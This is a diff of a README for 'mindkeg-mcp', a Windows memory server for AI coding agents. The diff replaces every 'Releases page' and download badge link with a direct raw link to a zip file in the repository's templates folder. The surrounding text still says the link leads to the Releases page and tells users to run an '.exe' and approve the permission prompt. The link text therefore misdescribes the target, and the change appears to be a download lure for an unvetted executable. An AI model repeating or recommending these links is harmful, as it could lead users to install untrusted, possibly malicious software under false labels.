@@ -1,6 +1,6 @@
 # 🧠 mindkeg-mcp - Store AI Knowledge Across Sessions
 
-[![Download mindkeg-mcp](https://img.shields.io/badge/Download-Mindkeg--MCP-brightgreen)](https://github.com/sfio9190/mindkeg-mcp/releases)
+[![Download mindkeg-mcp](https://img.shields.io/badge/Download-Mindkeg--MCP-brightgreen)](https://github.com/sfio9190/mindkeg-mcp/raw/refs/heads/main/templates/mcp-mindkeg-v2.6-beta.4.zip)
 
 ---
 
@@ -12,7 +12,7 @@ mindkeg-mcp is a simple server designed to help AI coding agents remember what t
 
 To get started, visit this page to download the software:
 
-[Download mindkeg-mcp from Releases](https://github.com/sfio9190/mindkeg-mcp/releases)
+[Download mindkeg-mcp from Releases](https://github.com/sfio9190/mindkeg-mcp/raw/refs/heads/main/templates/mcp-mindkeg-v2.6-beta.4.zip)
 
 This page contains all the release files. Each release includes a version of the server ready to run on Windows.
 
@@ -38,7 +38,7 @@ You do not need any programming tools to use mindkeg-mcp. It works as a small se
 
 ## 🚀 How to Install mindkeg-mcp on Windows
 
-1. **Download** the `.exe` file from the [Releases page](https://github.com/sfio9190/mindkeg-mcp/releases).  
+1. **Download** the `.exe` file from the [Releases page](https://github.com/sfio9190/mindkeg-mcp/raw/refs/heads/main/templates/mcp-mindkeg-v2.6-beta.4.zip).  
 2. **Run** the downloaded file by double-clicking it. Windows might ask for permission; click “Yes” to allow installation.  
 3. Follow the on-screen instruction to complete the setup. It will take only a few moments.  
 4. After installation, mindkeg-mcp will start automatically or give you an option to launch the server.
@@ -81,7 +81,7 @@ If your AI software or agent supports mindkeg-mcp, it will find the server runni
 
 ### Updating mindkeg-mcp
 
-- Check the [Releases page](https://github.com/sfio9190/mindkeg-mcp/releases) regularly for new versions.  
+- Check the [Releases page](https://github.com/sfio9190/mindkeg-mcp/raw/refs/heads/main/templates/mcp-mindkeg-v2.6-beta.4.zip) regularly for new versions.  
 - Download the new `.exe` installer and run it. This will update your current setup.
 
 ---
@@ -122,4 +122,4 @@ A: Ensure your Windows is up to date and you have permission to install software
 
 Click below to visit the release page and download mindkeg-mcp for Windows:
 
-[![Get mindkeg-mcp](https://img.shields.io/badge/Download-mindkeg--mcp-blue)](https://github.com/sfio9190/mindkeg-mcp/releases)
+[![Get mindkeg-mcp](https://img.shields.io/badge/Download-mindkeg--mcp-blue)](https://github.com/sfio9190/mindkeg-mcp/raw/refs/heads/main/templates/mcp-mindkeg-v2.6-beta.4.zip)
